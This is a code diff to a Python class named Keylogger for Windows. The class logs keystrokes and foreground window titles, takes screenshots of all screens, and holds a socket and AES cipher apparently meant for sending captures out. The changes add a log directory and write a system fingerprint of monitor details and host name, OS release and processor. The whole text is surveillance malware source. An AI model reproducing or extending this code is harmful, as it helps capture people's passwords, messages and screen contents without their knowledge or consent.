@@ -1,18 +1,20 @@
 # -*- coding: utf-8 -*-
+import Crypto.Cipher.AES as aes
+import hashlib
 import keyboard
 import mouse
-import time
+import os
+import platform
 import pyautogui
-import hashlib
-import Crypto.Cipher.AES as aes
-from threading import Thread
-from socket import socket
-from datetime import datetime, timedelta
-from PIL import ImageGrab
-from functools import partial
-from screeninfo import get_monitors
-from win32gui import GetWindowText, GetForegroundWindow
+import time
 
+from datetime import datetime, timedelta
+from functools import partial
+from PIL import ImageGrab
+from screeninfo import get_monitors
+from socket import socket
+from threading import Thread
+from win32gui import GetWindowText, GetForegroundWindow
 
 class Keylogger:
     def __init__(self, log_interval, window_interval, reconnect_interval):
@@ -33,6 +35,8 @@ class Keylogger:
         self.sock = socket()
         self.host = "127.0.0.1"
         self.port = 1005
+
+        self.log_directory = "tmp" #"C:\\tmp"
 
         ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
 
@@ -58,7 +62,11 @@ class Keylogger:
 
     def write_keylogs_to_file(self, foreground_window):
         if self.log:
-            with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
+            if not os.path.exists(self.log_directory):
+                os.makedirs(self.log_directory)
+
+            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
+            with open(os.path.join(self.log_directory, filename), "w", encoding="utf-8") as file:
                 file.write((
                         f"Foreground Window: {foreground_window}\n"
                         f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
@@ -67,18 +75,44 @@ class Keylogger:
                         f"------------------------\n\n"
                         f"{self.log}"
                     ))
-
             self.start_time = datetime.now()
         self.log = ""
 
     def write_information_file(self):
-        with open(f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
+        if not os.path.exists(self.log_directory):
+                os.makedirs(self.log_directory)
+
+        filename = f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
+        with open(os.path.join(self.log_directory, filename), "w+", encoding="utf-8") as file:
+            uname = platform.uname()
+
+            file.write("Monitors:\n")
+            for m in get_monitors():
+                file.write((
+                        f"\tname: {m.name}\n"
+                        f"\tx: {m.x}\n"
+                        f"\ty: {m.y}\n"
+                        f"\twidth (pixel): {m.width}\n"
+                        f"\theight (pixel): {m.height}\n"
+                        f"\twidth (mm): {m.width_mm}\n"
+                        f"\theight (mm): {m.height_mm}\n"
+                        f"\tis primary?: {m.is_primary}\n\n"
+                    ))
             file.write((
-                    f"Monitors: {get_monitors()}\n"
-                ))
+                        f"System: {uname.system}\n"
+                        f"Node Name: {uname.node}\n"
+                        f"Release: {uname.release}\n"
+                        f"Version: {uname.version}\n"
+                        f"Machine: {uname.machine}\n"
+                        f"Processor: {uname.processor}\n"
+                    ))
 
     def make_screenshot(self):
-        pyautogui.screenshot(f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png")
+        if not os.path.exists(self.log_directory):
+                os.makedirs(self.log_directory)
+        
+        filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
+        pyautogui.screenshot(os.path.join(self.log_directory, filename))
 
     def check_foreground_window(self):
         while self.active:
